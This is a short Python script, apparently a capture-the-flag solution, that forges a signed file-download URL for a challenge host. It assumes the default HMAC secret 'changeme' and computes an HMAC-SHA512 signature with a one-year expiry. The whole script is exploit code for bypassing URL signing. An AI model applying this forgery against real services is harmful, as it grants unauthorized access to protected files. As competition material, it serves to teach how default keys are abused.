import hashlib
import hmac
from datetime import datetime, timedelta
from urllib.parse import urlencode

SECRET_KEY = b'changeme' # Assuming the default secret key
RESOURCE_HASH = 'b0e9b3e3ae021b54eefca53e3a06a47d758198d7163edc054f8ee1456e491f20' # From the example URL

# Set expiry far in the future
expire_time = datetime.now() + timedelta(days=365)
expire_timestamp = int(expire_time.timestamp())

# Generate the HMAC digest
message = f'{RESOURCE_HASH}:{expire_timestamp}'.encode('ascii')
digest = hmac.new(SECRET_KEY, message, hashlib.sha512).hexdigest()

# Construct the URL
query_string = urlencode({'exp': expire_timestamp, 'S': digest})
forged_url = f'https://files-storage.ecsc25.hack.cert.pl/resource/{RESOURCE_HASH}?{query_string}'

print(f"Forged URL: {forged_url}")